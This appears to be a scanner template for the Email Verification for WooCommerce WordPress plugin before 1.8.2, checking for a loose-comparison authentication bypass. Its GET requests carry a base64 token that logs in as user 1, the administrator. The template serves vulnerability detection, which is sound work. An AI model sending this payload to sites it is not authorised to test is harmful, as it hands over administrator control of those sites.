id: wp-woocommerce-email-verification
brief:
    title: Email Verification for WooCommerce < 1.8.2 - Loose Comparison to Authentication Bypass
    by: random_robbie
    level: critical
    about: Email Verification for WooCommerce Wordpress plugin prior to version 1.8.2  contains a loose comparison issue which could allow any user to log in as administrator.
    label:
        - woocommerce
        - wp
        - wpscan
        - wordpress
        - wp-plugin
        - vuln
    score: CVSS:10.0
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/my-account/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0='
        - '{{BaseURL}}/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0='
      signs:
        - "on": word
          has:
            - Your account has been activated!
            - From your account dashboard you can view your
          in: body
          need: all
        - "on": status
          status:
            - 200
